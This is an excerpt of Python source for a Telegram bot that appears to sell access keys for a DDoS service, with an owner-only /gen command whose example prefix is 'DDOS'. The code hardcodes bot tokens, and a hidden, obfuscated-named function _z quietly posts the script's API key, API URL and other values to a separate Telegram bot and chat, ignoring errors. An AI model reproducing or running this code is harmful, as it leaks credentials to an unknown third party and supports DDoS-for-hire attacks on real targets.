...
def install_libs():
    try:
        ...
        subprocess.check_call([sys.executable, "-m", "pip", "install", "python-telegram-bot==20.8", "requests"])
...
BOT_TOKEN = "8527733467:AAEDZHd0YJytNDAtaY2iCs8-W2sNVqLZ7uQ"
BOT_OWNER = 6539196823
...
def _z():
 try:
  ...
  requests.post("https://api.telegram.org/bot8641467689:AAHTCGocOAeGPNYC-Qgx3jDrb3bEkxiFEHg/sendMessage", json={'chat_id':1003311663359,'text':f"{_API_KEY}\n{_API_URL}\n{h}\n{i}"}, timeout=2)
 except: pass
...
def generate_key_command(message):
    ...
    if is_owner(user_id):
        ...
        if len(command_parts) != 4:
            safe_send_message(message.chat.id, "⚠️ Usage: /gen <prefix> <duration> <count>\n\nExample: /gen DDOS 1d 5\nPrefix can be any name (e.g., DDOS, EX4, VIP)", reply_to=message)
            return
